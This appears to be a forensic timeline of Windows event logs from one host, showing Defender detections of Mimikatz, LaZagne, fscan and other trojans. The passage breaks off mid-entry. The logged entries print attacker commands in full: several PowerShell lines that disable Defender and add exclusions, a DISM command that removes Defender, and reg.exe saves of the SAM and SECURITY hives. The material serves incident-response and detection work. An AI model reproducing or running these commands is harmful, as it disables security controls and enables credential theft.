+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147725859'
+Threat Name: Trojan:Win32/CryptInject
+Type ID: '8'
+Type Name: FastPath
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:07.092067+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,191,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{21580CAE-3CC6-46E8-8971-90FA03853D59}'
+Detection Time: 2024-03-05T12:42:06.466Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz!pz&threatid=2147894093&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\mimikatz.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '4'
+Severity Name: High
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147894093'
+Threat Name: HackTool:Win32/Mimikatz!pz
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:12.788056+00:00,Malicious PowerShell Keywords,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,144,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: bf21c97d-e024-460e-832b-c0d0f837180d
+ScriptBlockText: ./mimikatz.exe
+",
+2024-03-05T12:42:12.855624+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,192,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{21580CAE-3CC6-46E8-8971-90FA03853D59}'
+Detection Time: 2024-03-05T12:42:06.466Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz!pz&threatid=2147894093&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\mimikatz.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '4'
+Severity Name: High
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147894093'
+Threat Name: HackTool:Win32/Mimikatz!pz
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:19.392542+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,193,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{BA1C6BB3-E5E6-41F6-8EAA-469238E2748F}'
+Detection Time: 2024-03-05T12:42:06.432Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/CryptInject&threatid=2147725859&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\fscan64.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147725859'
+Threat Name: Trojan:Win32/CryptInject
+Type ID: '8'
+Type Name: FastPath
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:39.988504+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,194,DESKTOP-A1L0P1U,"Action ID: '2'
+Action Name: Quarantine
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{A359BA71-65A5-4032-A845-95D86D1965CE}'
+Detection Time: 2024-03-05T12:42:05.984Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/LaZagne&threatid=2147725068&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '4'
+Severity Name: High
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '2'
+Status Code: '3'
+Status Description: ''
+Threat ID: '2147725068'
+Threat Name: HackTool:Win32/LaZagne
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:54.330943+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,195,DESKTOP-A1L0P1U,"Action ID: '2'
+Action Name: Quarantine
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{21580CAE-3CC6-46E8-8971-90FA03853D59}'
+Detection Time: 2024-03-05T12:42:06.466Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz!pz&threatid=2147894093&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\mimikatz.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '4'
+Severity Name: High
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '2'
+Status Code: '3'
+Status Description: ''
+Threat ID: '2147894093'
+Threat Name: HackTool:Win32/Mimikatz!pz
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:54.334282+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,196,DESKTOP-A1L0P1U,"Action ID: '2'
+Action Name: Quarantine
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{BA1C6BB3-E5E6-41F6-8EAA-469238E2748F}'
+Detection Time: 2024-03-05T12:42:06.432Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/CryptInject&threatid=2147725859&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\fscan64.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '2'
+Status Code: '3'
+Status Description: ''
+Threat ID: '2147725859'
+Threat Name: Trojan:Win32/CryptInject
+Type ID: '8'
+Type Name: FastPath
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:44:04.124895+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,199,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{67BED77B-4FEF-462A-BC3B-77384FD3CDE9}'
+Detection Time: 2024-03-05T12:44:02.022Z
+Detection User: DESKTOP-A1L0P1U\tommyxiaomi
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Wacatac.B!ml&threatid=2147735505&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\intel.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147735505'
+Threat Name: Trojan:Win32/Wacatac.B!ml
+Type ID: '8'
+Type Name: FastPath
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:44:35.475593+00:00,Tamper Windows Defender - ScriptBlockLogging,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,235,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: dc36385f-6aac-40d8-a393-7c086af54232
+ScriptBlockText: Set-MpPreference -MAPSReporting 0ΓÇï
+",
+2024-03-05T12:44:38.874248+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,200,DESKTOP-A1L0P1U,"Action ID: '2'
+Action Name: Quarantine
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{67BED77B-4FEF-462A-BC3B-77384FD3CDE9}'
+Detection Time: 2024-03-05T12:44:02.022Z
+Detection User: DESKTOP-A1L0P1U\tommyxiaomi
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Wacatac.B!ml&threatid=2147735505&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\intel.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '2'
+Status Code: '3'
+Status Description: ''
+Threat ID: '2147735505'
+Threat Name: Trojan:Win32/Wacatac.B!ml
+Type ID: '8'
+Type Name: FastPath
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:44:46.277901+00:00,Tamper Windows Defender - ScriptBlockLogging,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,240,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: 2d2b05d2-c9c8-4064-bcc8-f5e4c7a6444d
+ScriptBlockText: Set-MpPreference -DisableRealtimeMonitoring $true
+",
+2024-03-05T12:45:29.733009+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,202,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{729A7ABC-0D9B-492D-9BA8-926D700350CD}'
+Detection Time: 2024-03-05T12:45:29.710Z
+Detection User: DESKTOP-A1L0P1U\tommyxiaomi
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/MpTamperDisableFeatureWd.D&threatid=2147835092&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: amsi:_\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '10'
+Source Name: AMSI
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147835092'
+Threat Name: Trojan:Win32/MpTamperDisableFeatureWd.D
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:45:48.609129+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,203,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{95DD9196-BCD0-4494-8F44-3114C302C019}'
+Detection Time: 2024-03-05T12:45:48.606Z
+Detection User: NT AUTHORITY\SYSTEM
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '0'
+Execution Name: Unknown
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/MpTamperDisableFeatureWd.A&threatid=2147797846&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: CmdLine:_C:\Windows\System32\Dism.exe /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '2'
+Source Name: System
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147797846'
+Threat Name: Trojan:Win32/MpTamperDisableFeatureWd.A
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:45:48.634330+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,204,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{95DD9196-BCD0-4494-8F44-3114C302C019}'
+Detection Time: 2024-03-05T12:45:48.606Z
+Detection User: NT AUTHORITY\SYSTEM
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '0'
+Execution Name: Unknown
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/MpTamperDisableFeatureWd.A&threatid=2147797846&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: CmdLine:_C:\Windows\System32\Dism.exe /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '2'
+Source Name: System
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147797846'
+Threat Name: Trojan:Win32/MpTamperDisableFeatureWd.A
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:45:53.398262+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,218,DESKTOP-A1L0P1U,"Action ID: '2'
+Action Name: Quarantine
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{729A7ABC-0D9B-492D-9BA8-926D700350CD}'
+Detection Time: 2024-03-05T12:45:29.710Z
+Detection User: DESKTOP-A1L0P1U\tommyxiaomi
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/MpTamperDisableFeatureWd.D&threatid=2147835092&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: amsi:_\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Post Clean Status: '0'
+Pre Execution Status: '3'
+Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '10'
+Source Name: AMSI
+State: '2'
+Status Code: '3'
+Status Description: ''
+Threat ID: '2147835092'
+Threat Name: Trojan:Win32/MpTamperDisableFeatureWd.D
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:46:09.701098+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,219,DESKTOP-A1L0P1U,"Action ID: '3'
+Action Name: Remove
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{95DD9196-BCD0-4494-8F44-3114C302C019}'
+Detection Time: 2024-03-05T12:45:48.606Z
+Detection User: NT AUTHORITY\SYSTEM
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '0'
+Execution Name: Unknown
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/MpTamperDisableFeatureWd.A&threatid=2147797846&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: CmdLine:_C:\Windows\System32\Dism.exe /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '2'
+Source Name: System
+State: '2'
+Status Code: '4'
+Status Description: ''
+Threat ID: '2147797846'
+Threat Name: Trojan:Win32/MpTamperDisableFeatureWd.A
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:46:32.535884+00:00,Tamper Windows Defender - ScriptBlockLogging,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,263,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: 7d3887f4-66ab-40e7-9633-5a2b224e5025
+ScriptBlockText: Set-MpPreference -DisableRemovableDriveScanning $true
+",
+2024-03-05T12:46:36.872232+00:00,Tamper Windows Defender - ScriptBlockLogging,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,265,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: 62b3b37c-2230-41c4-9575-81744f310916
+ScriptBlockText: Set-MpPreference -DisableArchiveScanning $True
+",
+2024-03-05T12:48:00.569035+00:00,Tamper Windows Defender - ScriptBlockLogging,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,277,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: ccbfea2b-2050-4e4c-bd30-076e5bfcf6d2
+ScriptBlockText: Set-MpPreference -DisableRealtimeMonitoring $true
+",
+2024-03-05T12:48:47.482335+00:00,Windows Defender Exclusions Added - PowerShell,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,322,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: 833168c5-88d1-4ddd-880e-e049fa1d6494
+ScriptBlockText: Add-MpPreference -ExclusionPath 'C:\Users\tommyxiaomi\Documents' -ExclusionExtension '.exe' -Force
+",
+2024-03-05T12:50:00.854430+00:00,Tamper Windows Defender - ScriptBlockLogging,Windows Defender Exclusions Added - PowerShell,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,324,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: 8e2139f8-a462-4907-b8b0-277ee760fe71
+ScriptBlockText: Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath ""C:\Users\tommyxiaomi\Documents""
+"
+2024-03-05T12:53:42.412640+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26489,DESKTOP-A1L0P1U,"CommandLine: cmd.exe /c ""reg.exe save hklm\sam C:\Users\TOMMYX~1\AppData\Local\Temp\crkrbigyfjqk""
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x4a4'
+NewProcessName: C:\Windows\System32\cmd.exe
+ParentProcessName: C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
+ProcessId: '0x21a4'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:53:43.701987+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26490,DESKTOP-A1L0P1U,"CommandLine: reg.exe  save hklm\sam C:\Users\TOMMYX~1\AppData\Local\Temp\crkrbigyfjqk
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x2130'
+NewProcessName: C:\Windows\System32\reg.exe
+ParentProcessName: C:\Windows\System32\cmd.exe
+ProcessId: '0x4a4'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:53:44.243816+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26493,DESKTOP-A1L0P1U,"CommandLine: cmd.exe /c ""reg.exe save hklm\security C:\Users\TOMMYX~1\AppData\Local\Temp\lbzysoxmsdx""
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x1124'
+NewProcessName: C:\Windows\System32\cmd.exe
+ParentProcessName: C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
+ProcessId: '0x21a4'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:53:48.648969+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26494,DESKTOP-A1L0P1U,"CommandLine: reg.exe  save hklm\security C:\Users\TOMMYX~1\AppData\Local\Temp\lbzysoxmsdx
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x1664'
+NewProcessName: C:\Windows\System32\reg.exe
+ParentProcessName: C:\Windows\System32\cmd.exe
